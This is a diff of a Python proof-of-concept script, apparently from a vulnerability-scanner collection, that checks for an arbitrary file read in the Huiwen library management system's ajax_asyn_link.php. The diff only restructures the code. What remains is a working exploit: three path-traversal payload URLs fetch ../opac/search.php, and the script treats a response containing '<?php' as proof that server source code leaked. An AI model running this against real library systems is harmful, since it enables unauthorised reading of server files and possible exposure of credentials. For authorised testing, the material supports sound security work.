@@ -9,21 +9,14 @@ description: 漏洞影响3.5,4.0,5.0版本,漏洞文件位于ajax_asyn_link.php�
 import sys
 import requests
 import warnings
-
-  
-
-class ajax_asyn_link_fileread:
-    def __init__(self, url):
-        self.url = url
-
-    def run(self):
+def run(url):
         result = ['汇文软件图书管理系统ajax_asyn_link.php任意文件读取','','']
         try:
             noexist = True
             for payload in [r"/zplug/ajax_asyn_link.php?url=../opac/search.php",
                             r"/opac/zplug/ajax_asyn_link.php?url=../opac/search.php",
                             r"/hwweb/zplug/ajax_asyn_link.php?url=../opac/search.php"]:
-                vulnurl = self.url + payload
+                vulnurl = url + payload
 
                 req = requests.get(vulnurl, timeout=10, verify=False)
                 if r"<?php" in req.text:
@@ -38,5 +31,4 @@ class ajax_asyn_link_fileread:
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
-    testVuln = ajax_asyn_link_fileread(sys.argv[1])
-    testVuln.run()
+    testVuln = run(sys.argv[1])
